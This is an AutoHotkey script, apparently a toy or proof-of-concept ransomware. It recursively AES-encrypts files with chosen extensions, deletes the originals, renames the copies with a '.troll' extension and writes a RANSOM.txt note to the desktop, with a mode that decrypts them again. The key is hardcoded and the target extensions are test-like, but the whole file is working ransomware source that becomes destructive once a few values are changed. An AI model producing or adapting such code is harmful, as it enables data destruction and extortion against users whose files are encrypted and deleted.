#NoEnv
#NoTrayIcon

#Include, crypto.ahk

; Mode. Either Encryption or Decryption
ScriptMODE = DECRYPTION

KEY = 1234567890123456
IV  = 6543210987654321
ALGO = AES
MODE = CBC
OUTPUT = HEXRAW

; Coma-separated list of extensions to encrypt
Extz = txttestransom,txtransomtest

; Extension to assign to encrypted Files
EncExt = troll

EncFiles := []

RansomNote := "Your files have been encrypted using " ALGO "-" MODE ". The encryption key was " KEY " with initialisation vector " IV "`n`n"
DecryptInfo := "Simply run this script in DECRYPTION mode to retrieve your files."

Loop, Files, %A_WorkingDir%\* , R
{
    if (ScriptMODE="ENCRYPTION")
    {
        if A_LoopFileExt contains %Extz%
        {
            FileRead, Contents, %A_LoopFileFullPath%
            NewContent := Crypt.Encrypt.String(ALGO, MODE, Contents, KEY, IV,, OUTPUT)
            FileAppend, %NewContent%, %A_LoopFileFullPath%.%EncExt%
            FileSetAttrib, -R, %A_LoopFileFullPath%
            FileDelete, %A_LoopFileFullPath%
            Contents := ""
            NewContent := ""
            EncFiles.Push(A_LoopFileFullPath)
        }
    }
    else if (ScriptMODE="DECRYPTION")
    {
        if A_LoopFileExt contains %EncExt%
        {
            FileRead, Contents, %A_LoopFileFullPath%
            SplitPath, A_LoopFileFullPath,,,, NewFilename
            NewContent := Crypt.Decrypt.String(ALGO, MODE, Contents, KEY, IV,, OUTPUT)
            FileAppend, %NewContent%, %NewFilename%
            FileDelete, %A_LoopFileFullPath%
            Contents := ""
            NewContent := ""
            EncFiles.Push(A_LoopFileFullPath)
        }
    }
    else
    {
        MsgBox Incorrect MODE
        ExitApp
    }
}

EncFilesOut := ""
For i in EncFiles 
    EncFilesOut .= "`n"EncFiles[i]


if (ScriptMODE="ENCRYPTION")
    {
        FileAppend,%RansomNote%The following files have been encrypted: %EncFilesOut% `n`n%DecryptInfo% , %A_Desktop%\RANSOM.txt
        Run Edit %A_Desktop%\RANSOM.txt
    }
else
{
    MsgBox "Files successfully decrypted. Here's the list: " %EncFilesOut%
}

